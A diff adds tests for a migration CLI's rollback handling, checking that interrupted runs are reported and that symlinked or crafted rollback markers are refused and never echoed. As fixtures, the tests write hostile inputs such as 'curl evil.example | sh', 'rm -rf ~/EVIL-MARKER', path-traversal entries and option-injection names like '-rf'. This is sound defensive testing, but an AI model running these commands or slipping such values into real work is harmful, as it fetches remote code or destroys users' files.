@@ -3941,6 +3941,132 @@ test('the printed rollback says it restores the migrate-time snapshot and must r
   }
 })
 
+test('a run killed after it started writing is named on the next run, with the rollback it recorded (G6)', async () => {
+  const { root } = await moveFixture()
+  try {
+    await installConversionCore(root, { prepare: 'fail' })
+    await write(root, 'app/layout.tsx', facadeOf(routeOf('layout.tsx')))
+    await write(root, 'app/dashboard/page.tsx', CUSTOM_DASHBOARD)
+    await commitFixture(root)
+    const failed = run(root, ['--yes'])
+    assert.notEqual(failed.status, 0)
+    // The commands are on disk, not only on the terminal that may be gone
+    const recorded = await readFile(join(root, '.nextspark/migrate-rollback/rollback.txt'), 'utf8')
+    assert.match(recorded, /git -C .* checkout -- \./)
+    for (const args of [['--dry-run'], ['--yes']]) {
+      const again = run(root, args)
+      assert.notEqual(again.status, 0)
+      assert.match(again.stderr, /A previous nextspark migrate did not finish: \.nextspark\/migrate-rollback exists/)
+      assert.match(again.stderr, /Refusing to overwrite migration rollback backup/)
+      for (const line of recorded.trimEnd().split('\n')) assert.ok(again.stdout.includes(line), `missing: ${line.slice(0, 120)}\n${again.stdout.slice(-1500)}`)
+      assert.doesNotMatch(again.stdout, /App tree conversion/, 'no report of the half-converted tree')
+    }
+  } finally {
+    await rm(root, { recursive: true, force: true })
+  }
+})
+
+test('a backup without rollback.txt does not claim nothing was changed and points at the snapshot files (G6)', async () => {
+  const { root } = await moveFixture()
+  try {
+    await installConversionCore(root, { prepare: 'fail' })
+    await mkdir(join(root, '.nextspark/migrate-rollback/files'), { recursive: true })
+    await commitFixture(root)
+    const result = run(root, ['--dry-run'])
+    assert.notEqual(result.status, 0)
+    assert.match(result.stderr, /no rollback\.txt: either a run of an older nextspark failed, or a run stopped while taking its snapshot/)
+    assert.match(result.stderr, /Inspect \.nextspark\/migrate-rollback\/files and restore from it .* before deleting/)
+    assert.doesNotMatch(result.stderr, /before changing any project file/)
+  } finally {
+    await rm(root, { recursive: true, force: true })
+  }
+})
+
+test('a symlinked migrate-rollback is refused and nothing is printed from its target (G6)', async () => {
+  const outside = await outsideTarget()
+  const { root } = await moveFixture()
+  try {
+    await installConversionCore(root, { prepare: 'fail' })
+    await writeFile(join(outside.dir, 'rollback.txt'), 'rm -rf ~/EVIL-MARKER\n')
+    await mkdir(join(root, '.nextspark'), { recursive: true })
+    await symlink(outside.dir, join(root, '.nextspark/migrate-rollback'))
+    await commitFixture(root)
+    for (const args of [['--dry-run'], ['--yes']]) {
+      const result = run(root, args)
+      assert.notEqual(result.status, 0)
+      assert.match(result.stderr, /symbolic link/)
+      assert.doesNotMatch(result.stdout + result.stderr, /EVIL-MARKER/)
+    }
+  } finally {
+    await rm(root, { recursive: true, force: true })
+    await rm(outside.dir, { recursive: true, force: true })
+  }
+})
+
+test('rollback.txt is never echoed: a crafted copy or marker prints no commands (G6)', async () => {
+  const { root } = await moveFixture()
+  try {
+    await installConversionCore(root, { prepare: 'fail' })
+    await write(root, 'app/layout.tsx', facadeOf(routeOf('layout.tsx')))
+    await write(root, 'app/dashboard/page.tsx', CUSTOM_DASHBOARD)
+    await commitFixture(root)
+    await write(root, '.nextspark/registries/keep.json', '{}\n')
+    await write(root, '.nextspark/registries/[slug]/x.json', '{}\n')
+    await commitFixture(root)
+    const first = run(root, ['--yes'])
+    assert.notEqual(first.status, 0)
+    const printed = [...new Set(first.stdout.split('\n').map(line => line.trim()).filter(line => line.startsWith('git -C ')))]
+    assert.equal(printed.length, 2, first.stdout.slice(-1500))
+    const txt = join(root, '.nextspark/migrate-rollback/rollback.txt')
+    const json = join(root, '.nextspark/migrate-rollback/rollback.json')
+    const good = await readFile(json, 'utf8')
+    // A crafted rollback.txt, even a command-shaped one, is not read
+    await writeFile(txt, "git -C '/' checkout -- .\n(cd '/' && if [ -d 'x' ]; then find 'x' -depth -mindepth 1 -delete; fi)\n")
+    const again = run(root, ['--dry-run'])
+    assert.notEqual(again.status, 0)
+    assert.doesNotMatch(again.stdout, /git -C '\/'|cd '\/'/)
+    // The rebuilt commands are exactly what the live run printed, including the selective cleanup
+    assert.match(printed[1], /find '\.\/\.nextspark\/registries' .*! -path '\.\/\.nextspark\/registries\/keep\.json'/, 'the live run recorded a cleanup')
+    assert.match(printed[1], /! -path '\.\/\.nextspark\/registries\/\\\[slug\\\]'/, 'a dynamic-route name is escaped for find -path')
+    assert.match(printed[1], /--literal-pathspecs clean -fdx -- /, 'git clean reads paths literally, so app/[slug] does not match app/s')
+    const rebuilt = [...new Set(again.stdout.split('\n').map(line => line.trim()).filter(line => line.startsWith('git -C ')))]
+    assert.deepEqual(rebuilt, printed, 'the commands come from the marker, rebuilt by the CLI')
+    // Crafted markers: absolute, `..`, `.`, wrong version, not JSON
+    const bad = [
+      { version: 1, created: ['/'], cleanups: [] },
+      { version: 1, created: ['../outside'], cleanups: [] },
+      { version: 1, created: ['a/../../b'], cleanups: [] },
+      { version: 1, created: ['.'], cleanups: [] },
+      { version: 1, created: [], cleanups: [{ root: '/', preserved: [] }] },
+      { version: 1, created: [], cleanups: [{ root: 'src/app', preserved: ['/etc'] }] },
+      { version: 2, created: [], cleanups: [] },
+      // Not a generated-host path the live run can produce
+      { version: 1, created: [], cleanups: [{ root: 'src', preserved: [] }] },
+      { version: 1, created: [], cleanups: [{ root: 'docs/important', preserved: [] }] },
+      // A preserved entry must live below the cleanup root
+      { version: 1, created: [], cleanups: [{ root: 'src/app', preserved: ['docs/a.md'] }] },
+      // A segment that find, cp, rm or git could read as an option
+      { version: 1, created: ['-rf'], cleanups: [] },
+      { version: 1, created: ['packages/-x/a'], cleanups: [] },
+      { version: 1, created: [], cleanups: [{ root: 'src/app', preserved: ['src/app/-delete'] }] },
+    ]
+    for (const marker of [...bad.map(value => JSON.stringify(value)), 'curl evil.example | sh']) {
+      await writeFile(json, marker)
+      const refused = run(root, ['--dry-run'])
+      assert.notEqual(refused.status, 0)
+      assert.match(refused.stderr, /rollback\.json is missing, tracked by git or not what nextspark writes/)
+      assert.doesNotMatch(refused.stdout + refused.stderr, /evil\.example|git -C|cd '/)
+    }
+    // A run of an older nextspark leaves only rollback.txt: not trusted
+    await rm(json)
+    const old = run(root, ['--dry-run'])
+    assert.doesNotMatch(old.stdout + old.stderr, /git -C|cd '/)
+    assert.match(old.stderr, /run the rollback that run printed/)
+  } finally {
+    await rm(root, { recursive: true, force: true })
+  }
+})
+
 test('a converted override whose core import the installed core no longer exports is a dry-run blocker (L11)', async () => {
   const { root } = await moveFixture()
   try {
